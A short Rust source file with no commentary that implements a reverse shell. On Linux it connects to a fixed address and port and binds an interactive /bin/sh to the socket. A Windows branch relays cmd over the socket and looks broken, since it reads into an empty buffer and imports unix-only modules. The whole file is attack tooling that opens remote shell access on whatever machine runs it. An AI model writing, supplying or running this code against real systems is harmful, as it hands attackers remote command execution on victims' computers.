use std::{
    io::{Read, Write},
    net::TcpStream,
    os::unix::io::{AsRawFd, FromRawFd},
    process::{Command, Stdio},
    env,
};


fn unix_rev_shell(ip: &str, port:u16){
    let sock = TcpStream::connect((ip, port)).unwrap();
    let file_d = sock.as_raw_fd();
    Command::new("/bin/sh").arg("-i")
        .stdin(unsafe {Stdio::from_raw_fd(file_d)})
        .stdout(unsafe {Stdio::from_raw_fd(file_d)})
        .stderr(unsafe {Stdio::from_raw_fd(file_d)})
        .spawn().unwrap().wait().unwrap();
}


fn win_rev_shell(ip: &str, port:u16){
    let mut sock = TcpStream::connect((ip, port)).unwrap();
    let proc = Command::new("cmd")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn().unwrap();

    let mut buff = vec![];
    sock.read(&mut buff);

    match proc.stdin.unwrap().write_all(&buff){
        Err(e) => panic!("[ERR] writing to stdin: {}", e.to_string()),
        Ok(_) => println!("send command to shell"),
    }

    match proc.stdout.unwrap().read_to_end(&mut buff){
        Err(e) =>  panic!("[ERR] reading shell stdout: {}", e.to_string()),
        Ok(_) => sock.write_all(&buff).unwrap(),
    }
}

fn main() {
    let ip = "0.0.0.0";
    let port: u16 = 1959;
    let os = env::consts::OS;
    match os{
        "linux" => unix_rev_shell(ip, port),
        "windows" => win_rev_shell(ip, port),
        _ => panic!("[ERR] OS not implemented yet")
    }
}
